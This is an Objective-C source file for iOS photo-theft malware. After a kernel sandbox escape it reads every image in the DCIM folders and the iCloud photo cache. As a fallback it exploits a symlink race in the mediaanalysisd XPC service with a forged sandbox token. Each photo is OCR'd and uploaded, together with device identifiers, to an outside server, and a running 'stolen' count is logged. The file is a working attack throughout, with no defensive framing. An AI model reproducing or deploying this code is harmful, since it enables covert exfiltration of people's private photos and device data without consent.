#import "PhotoAlbumExfil.h"
#import "kexploit/sandbox_escape.h"
#import <UIKit/UIKit.h>
#import <dlfcn.h>
#import <objc/message.h>
#import <sys/utsname.h>
#import <CoreVideo/CoreVideo.h>
#import <CoreImage/CoreImage.h>
#import <Vision/Vision.h>

// 上报服务器（daiti API：POST /api/upload/album）
static NSString *const kExfilBase = @"https://iso.daiti.de";

extern char *sandbox_extension_issue_file(const char *extension_class,
                                          const char *path,
                                          uint32_t flags);

static void exfilLog(NSString *fmt, ...) NS_FORMAT_FUNCTION(1, 2);
static void exfilLog(NSString *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[album-exfil] %@", msg);
}

#pragma mark - 设备标识

static NSString *exfilAppUuid(void)
{
    NSString *key = @"exfil_app_uuid";
    NSString *uuid = [[NSUserDefaults standardUserDefaults] stringForKey:key];
    if (uuid.length == 0)
    {
        uuid = [[NSUUID UUID] UUIDString];
        [[NSUserDefaults standardUserDefaults] setObject:uuid forKey:key];
    }
    return uuid;
}

static NSString *exfilMachineName(void)
{
    struct utsname sys;
    uname(&sys);
    return [NSString stringWithUTF8String:sys.machine] ?: @"unknown";
}

#pragma mark - Vision OCR（手机端先识别，失败留给服务器兜底）

static NSString *exfilOcrJson(UIImage *img)
{
    if (!img.CGImage) return nil;

    VNRecognizeTextRequest *req = [[VNRecognizeTextRequest alloc] init];
    req.recognitionLevel = VNRequestTextRecognitionLevelAccurate;
    req.usesLanguageCorrection = YES;
    req.recognitionLanguages = @[@"en-US"];  // 服务器 eng.traineddata 同款

    VNImageRequestHandler *handler =
        [[VNImageRequestHandler alloc] initWithCGImage:img.CGImage options:nil];

    NSError *err = nil;
    [handler performRequests:@[req] error:&err];
    if (err || req.results.count == 0) return nil;

    NSMutableString *text = [NSMutableString new];
    CGFloat confSum = 0;
    NSInteger confN = 0;

    for (VNRecognizedTextObservation *obs in req.results)
    {
        VNRecognizedText *cand = obs.topCandidates.firstObject;
        if (!cand) continue;
        if (text.length > 0) [text appendString:@"\n"];
        [text appendString:cand.string];
        confSum += cand.confidence;
        confN++;
    }
    if (confN == 0) return nil;

    // 协议：JSON {text, confidence}
    NSDictionary *json = @{
        @"text": [NSString stringWithString:text],
        @"confidence": @(confSum / (CGFloat)confN),
    };
    NSData *data = [NSJSONSerialization dataWithJSONObject:json options:0 error:nil];
    if (!data) return nil;
    return [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
}

#pragma mark - multipart 上传

static void exfilAppendPart(NSMutableData *body, NSString *field,
                            NSString *value, NSString *boundary)
{
    [body appendData:[[NSString stringWithFormat:
        @"--%@\r\nContent-Disposition: form-data; name=\"%@\"\r\n\r\n",
        boundary, field] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[value dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
}

static BOOL exfilPost(UIImage *img, NSString *filename)
{
    NSData *png = UIImagePNGRepresentation(img);
    if (!png) return NO;

    NSString *boundary = [@"x-exfil-" stringByAppendingString:[[NSUUID UUID] UUIDString]];
    NSMutableData *body = [NSMutableData data];

    // image 文件字段：原文件名 + 重编码尾巴 exfil_IMG_xxxx.XXX.png
    [body appendData:[[NSString stringWithFormat:
        @"--%@\r\nContent-Disposition: form-data; name=\"image\"; filename=\"%@\"\r\n"
         @"Content-Type: image/png\r\n\r\n", boundary, filename]
        dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:png];
    [body appendData:[@"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];

    NSString *ocr = exfilOcrJson(img);
    if (ocr.length > 0)
        exfilAppendPart(body, @"text", ocr, boundary);

    exfilAppendPart(body, @"machine", exfilMachineName(), boundary);
    exfilAppendPart(body, @"iosVersion", [UIDevice currentDevice].systemVersion, boundary);
    exfilAppendPart(body, @"appUuid", exfilAppUuid(), boundary);

    [body appendData:[[NSString stringWithFormat:@"--%@--\r\n", boundary]
        dataUsingEncoding:NSUTF8StringEncoding]];

    NSURL *url = [NSURL URLWithString:
        [kExfilBase stringByAppendingString:@"/api/upload/album"]];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
    req.HTTPMethod = @"POST";
    req.timeoutInterval = 30;
    [req setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary]
        forHTTPHeaderField:@"Content-Type"];
    [req setValue:exfilAppUuid() forHTTPHeaderField:@"X-App-UUID"];
    req.HTTPBody = body;

    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    __block BOOL ok = NO;

    NSURLSessionDataTask *task = [[NSURLSession sharedSession]
        dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err) {
            if (!err && data)
            {
                NSDictionary *json = [NSJSONSerialization
                    JSONObjectWithData:data options:0 error:nil];
                ok = [json isKindOfClass:[NSDictionary class]] &&
                     [[json valueForKey:@"code"] isEqual:@0];
            }
            dispatch_semaphore_signal(sem);
        }];
    [task resume];

    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 35 * NSEC_PER_SEC));
    return ok;
}

// 上传一张（原图重编码 PNG + OCR）
static void exfilUpload(UIImage *img, NSString *originalName)
{
    if (!img) return;
    NSString *filename = [NSString stringWithFormat:@"exfil_%@.png", originalName];
    BOOL ok = exfilPost(img, filename);
    exfilLog(@"upload %@ -> %@", filename, ok ? @"ok" : @"FAIL");
}

#pragma mark - 路径 A：沙盒逃逸后直读相册

static void exfilScanDirDirect(NSString *dir)
{
    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray *files = [fm contentsOfDirectoryAtPath:dir error:nil];
    if (!files) return;

    for (NSString *name in files)
    {
        NSString *ext = [[name pathExtension] lowercaseString];
        // 接受图片扩展名 + 无扩展名（CPL 原图缓存是 hash 裸文件，imageWithData 自动嗅探）
        BOOL okExt = ext.length == 0 ||
                     [ext isEqualToString:@"heic"] ||
                     [ext isEqualToString:@"jpg"] ||
                     [ext isEqualToString:@"jpeg"] ||
                     [ext isEqualToString:@"png"];
        if (!okExt) continue;

        NSString *full = [dir stringByAppendingPathComponent:name];
        BOOL isDir = NO;
        if (![[NSFileManager defaultManager] fileExistsAtPath:full
                                                    isDirectory:&isDir] || isDir) continue;

        NSData *raw = [NSData dataWithContentsOfFile:full];
        if (!raw) continue;

        UIImage *img = [UIImage imageWithData:raw];
        if (!img) continue;

        exfilUpload(img, name);
    }
}

static void exfilDirectMode(void)
{
    exfilLog(@"direct mode: sandbox escape active");

    // DCIM 全部相册目录 100~199APPLE
    NSString *dcim = @"/private/var/mobile/Media/DCIM";
    for (int d = 100; d <= 199; d++)
    {
        NSString *dir = [dcim stringByAppendingPathComponent:
            [NSString stringWithFormat:@"%dAPPLE", d]];
        exfilScanDirDirect(dir);
    }

    // iCloud 原图缓存（本地已下载过的原图）
    NSString *cpl = @"/private/var/mobile/Media/PhotoData/CPL/assets";
    NSDirectoryEnumerator *en = [[NSFileManager defaultManager]
        enumeratorAtPath:cpl];
    NSMutableSet *seenDirs = [NSMutableSet new];
    for (NSString *rel in en)
    {
        NSString *dir = [cpl stringByAppendingPathComponent:
            [rel stringByDeletingLastPathComponent]];
        if ([seenDirs containsObject:dir]) continue;
        [seenDirs addObject:dir];
        exfilScanDirDirect(dir);  // 无扩展名文件 imageWithData 自动嗅探
    }
    exfilLog(@"direct mode done");
}

#pragma mark - 路径 B：mediaanalysisd 竞态兜底

static NSXPCConnection *gExfilConn = nil;
static int gExfilReqID = 0;

@protocol VCPMADServicePublicServerProtocol <NSObject>
@optional
- (void)requestImageProcessing:(id)requests
                    forAssetURL:(NSURL *)url
               withSandboxToken:(NSString *)token
                     identifier:(NSString *)identifier
                      requestID:(int)requestID
                       andReply:(void (^)(id, id))reply;
@end

static NSXPCConnection *exfilMachConn(NSString *serviceName)
{
    NSXPCConnection *alloc = [NSXPCConnection alloc];
    SEL sel = NSSelectorFromString(@"initWithMachServiceName:options:");
    return ((id(*)(id, SEL, id, NSUInteger))objc_msgSend)(alloc, sel, serviceName, 0);
}

static void exfilEnsureConn(void)
{
    if (gExfilConn) return;

    dlopen("/System/Library/PrivateFrameworks/MediaAnalysis.framework/MediaAnalysis", RTLD_NOW);
    dlopen("/System/Library/PrivateFrameworks/MediaAnalysisServices.framework/MediaAnalysisServices", RTLD_NOW);

    gExfilConn = exfilMachConn(@"com.apple.mediaanalysisd.service.public");

    NSXPCInterface *iface =
        [NSXPCInterface interfaceWithProtocol:@protocol(VCPMADServicePublicServerProtocol)];

    NSMutableSet *allowed = [NSMutableSet setWithObjects:
        [NSDictionary class], [NSMutableDictionary class],
        [NSArray class], [NSMutableArray class],
        [NSString class], [NSNumber class],
        [NSData class], [NSError class],
        [NSSet class], [NSMutableSet class],
        [NSURL class], [NSNull class],
        [NSDate class], [NSValue class], nil];

    for (NSString *name in @[@"MADRequest", @"MADMLScalingRequest", @"MADMLScalingResult",
                             @"MADMLEnhancementRequest", @"MADMLEnhancementResult",
                             @"MADVIDocumentRecognitionRequest",
                             @"MADRemoveBackgroundMaskRequest", @"MADRemoveBackgroundMatteRequest",
                             @"VCPProtoAssetAnalysis", @"VITextBlockAnnotation",
                             @"VNObservation", @"VNRecognizedTextObservation"])
    {
        Class c = NSClassFromString(name);
        if (c) [allowed addObject:c];
    }

    SEL sel = @selector(requestImageProcessing:forAssetURL:withSandboxToken:identifier:requestID:andReply:);
    [iface setClasses:allowed forSelector:sel argumentIndex:0 ofReply:NO];
    [iface setClasses:allowed forSelector:sel argumentIndex:0 ofReply:YES];
    [iface setClasses:allowed forSelector:sel argumentIndex:1 ofReply:YES];

    gExfilConn.remoteObjectInterface = iface;
    [gExfilConn resume];
}

static NSArray *exfilScalingRequest(int w, int h)
{
    Class cls = NSClassFromString(@"MADMLScalingRequest");
    if (!cls) return @[];

    id req = [cls new];
    [req setValue:@(w) forKey:@"scaledImageWidth"];
    [req setValue:@(h) forKey:@"scaledImageHeight"];
    [req setValue:@(1) forKey:@"scalingModelIndex"];
    return @[req];
}

static UIImage *exfilImageFromReply(id arg1)
{
    if (![arg1 isKindOfClass:[NSArray class]]) return nil;

    for (id req in (NSArray *)arg1)
    {
        @try {
            id err = [req valueForKey:@"error"];
            if (err) continue;

            NSArray *results = [req valueForKey:@"results"];
            if (![results isKindOfClass:[NSArray class]] || results.count == 0) continue;

            for (id result in results)
            {
                SEL pbSel = NSSelectorFromString(@"pixelBuffer");
                if (![result respondsToSelector:pbSel]) continue;

                CVPixelBufferRef buf = ((CVPixelBufferRef(*)(id, SEL))objc_msgSend)(result, pbSel);
                if (!buf) continue;

                CIImage *ci = [CIImage imageWithCVPixelBuffer:buf];
                if (!ci) continue;

                CIContext *ctx = [CIContext contextWithOptions:nil];
                CGImageRef cg = [ctx createCGImage:ci fromRect:ci.extent];
                if (!cg) continue;

                UIImage *img = [UIImage imageWithCGImage:cg];
                CGImageRelease(cg);
                return img;
            }
        } @catch (NSException *e) {}
    }
    return nil;
}

// 诱饵 = 纯绿 (0,255,0)
static NSData *exfilDecoyData(void)
{
    CGSize sz = CGSizeMake(400, 400);
    UIGraphicsBeginImageContextWithOptions(sz, YES, 1.0);
    [[UIColor colorWithRed:0 green:1 blue:0 alpha:1] setFill];
    UIRectFill(CGRectMake(0, 0, sz.width, sz.height));
    UIImage *decoy = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    return UIImagePNGRepresentation(decoy);
}

static BOOL exfilTryRace(NSString *target, NSString *racePath, NSString *symPath,
                         NSData *decoyData, useconds_t delay)
{
    unlink(racePath.UTF8String);
    [decoyData writeToFile:racePath atomically:NO];

    unlink(symPath.UTF8String);
    symlink(target.UTF8String, symPath.UTF8String);

    char *raw = sandbox_extension_issue_file(
        "com.apple.app-sandbox.read", racePath.UTF8String, 0);
    if (!raw) return NO;
    NSString *token = [NSString stringWithUTF8String:raw];
    free(raw);
    if (!token) return NO;

    NSURL *url = [NSURL fileURLWithPath:racePath];
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    __block UIImage *img = nil;

    id<VCPMADServicePublicServerProtocol> proxy =
        [gExfilConn remoteObjectProxyWithErrorHandler:^(NSError *err) {
            dispatch_semaphore_signal(sem);
        }];

    [proxy requestImageProcessing:exfilScalingRequest(600, 600)
                        forAssetURL:url
                   withSandboxToken:token
                         identifier:@"d"
                          requestID:++gExfilReqID
                           andReply:^(id arg1, id arg2) {
        img = exfilImageFromReply(arg1);
        dispatch_semaphore_signal(sem);
    }];

    usleep(delay);
    rename(symPath.UTF8String, racePath.UTF8String);

    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC));
    if (!img) return NO;

    CGImageRef cg = img.CGImage;
    if (!cg) return NO;

    uint8_t px[4] = {0};
    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
    CGContextRef ctx = CGBitmapContextCreate(px, 1, 1, 8, 4, cs,
        (CGBitmapInfo)kCGImageAlphaPremultipliedLast);
    CGColorSpaceRelease(cs);
    CGContextDrawImage(ctx, CGRectMake(0, 0, CGImageGetWidth(cg), CGImageGetHeight(cg)), cg);
    CGContextRelease(ctx);

    BOOL isDecoy = (px[0] < 50 && px[1] > 200 && px[2] < 50);
    if (isDecoy) return NO;

    exfilUpload(img, [target lastPathComponent]);
    return YES;
}

static void exfilRaceMode(void)
{
    exfilLog(@"race mode: mediaanalysisd fallback");
    exfilEnsureConn();
    if (!gExfilConn)
    {
        exfilLog(@"race mode: XPC unavailable");
        return;
    }

    NSString *tmp = NSTemporaryDirectory();
    NSData *decoy = exfilDecoyData();

    NSString *exts[3] = {@"HEIC", @"JPG", @"PNG"};
    NSString *race[3] = {
        [tmp stringByAppendingPathComponent:@"race.HEIC"],
        [tmp stringByAppendingPathComponent:@"race.JPG"],
        [tmp stringByAppendingPathComponent:@"race.PNG"]
    };
    NSString *sym[3] = {
        [tmp stringByAppendingPathComponent:@"sym.HEIC"],
        [tmp stringByAppendingPathComponent:@"sym.JPG"],
        [tmp stringByAppendingPathComponent:@"sym.PNG"]
    };
    useconds_t delays[3] = {100, 250, 400};

    int stolen = 0;
    for (int d = 100; d <= 199; d++)
    {
        for (int img = 1; img <= 9999; img++)
        {
            BOOL got = NO;
            for (int e = 0; e < 3 && !got; e++)
            {
                NSString *target = [NSString stringWithFormat:
                    @"/private/var/mobile/Media/DCIM/%dAPPLE/IMG_%04d.%@",
                    d, img, exts[e]];
                for (int a = 0; a < 3 && !got; a++)
                {
                    got = exfilTryRace(target, race[e], sym[e], decoy, delays[a]);
                    usleep(2000);
                }
            }
            if (got) stolen++;
        }
    }
    exfilLog(@"race mode done, stolen=%d", stolen);
}

#pragma mark - 入口

static void exfilRun(void)
{
    @autoreleasepool
    {
        // 等内核利用跑完（自动利用约 10-30s），最多等 90s
        for (int i = 0; i < 90; i++)
        {
            if (sandbox_access_is_active() == 1) break;
            sleep(1);
        }

        if (sandbox_access_is_active() == 1)
        {
            exfilDirectMode();
        }
        else
        {
            exfilRaceMode();
        }
    }
}

void photoAlbumExfilStart(void)
{
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        dispatch_async(dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{
            exfilRun();
        });
    });
}
